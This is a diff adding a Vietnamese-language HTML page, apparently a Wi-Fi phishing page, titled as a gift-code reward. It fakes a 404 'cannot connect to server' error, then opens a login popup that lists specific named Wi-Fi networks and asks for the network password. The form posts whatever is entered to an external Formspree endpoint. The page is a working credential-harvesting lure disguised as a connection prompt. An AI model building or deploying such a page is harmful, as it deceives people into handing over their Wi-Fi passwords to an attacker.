@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<meta charset="UTF-8"> 
+<head>
+<title>Gift code nhận quà</title>
+</head>
+<body>
+<p style="font-family:courier;text-align:center;font-size:500%"><i>Error 404 not Found</i></p>
+<h1 style="text-align:center;font-size:300%">Không thể kết nối đến máy chủ:((</h1>
+<p style="text-align:center"></p>
+
+</body>
+
+
+ <!-- Nút mở form -->
+    <button onclick="openForm()" class="large-button">Tiếp tục kết nối với Wi-fi</button>
+        <style>
+        .large-button {
+            width: 200px; /* Chiều rộng */
+            height: 70px; /* Chiều cao */
+            font-size: 20px; /* Kích thước chữ */
+            padding: 10px 20px; /* Khoảng cách bên trong */
+        }
+    </style>
+
+    <!-- Popup form đăng nhập -->
+    <div id="popupForm" style="display: none;">
+        <div>
+            <button onclick="closeForm()">Close</button>
+            <h2>Login</h2>
+        <form
+  action="https://formspree.io/f/xdkoewzo"
+  method="POST"
+>
+                <label for="Wi-fi">Chọn Wi-fi của bạn</label>
+  <select id="Wi-fi" name="Wi-fi">
+    <option value="FPT Telecom 2.4Hz">FPT Telecom 2.4Hz</option>
+    <option value="Tuan">Tuan</option>
+    <option value="Le Hung">Le Hung</option>
+    <option value="MiMeo2.4G">Mi Meo 2.4G</option>
+    <option value="MiMeo 5Ghz">Mi Meo 5Ghz</option>
+  </select>  
+<label for="lname">Mật khẩu:</label>
+  <input type="text" id="lname" name="lname"><br><br>
+  <!-- your other form fields go here -->
+  <button type="submit">Send</button>
+</form>
+            </div>
+    </div>
+<script>
+        // Hàm mở form
+        function openForm() {
+            document.getElementById("popupForm").style.display = "block";
+        }
+
+        // Hàm đóng form
+        function closeForm() {
+            document.getElementById("popupForm").style.display = "none";
+        }
+    </script>
+ 
+</body>
+
+
+
+</html>
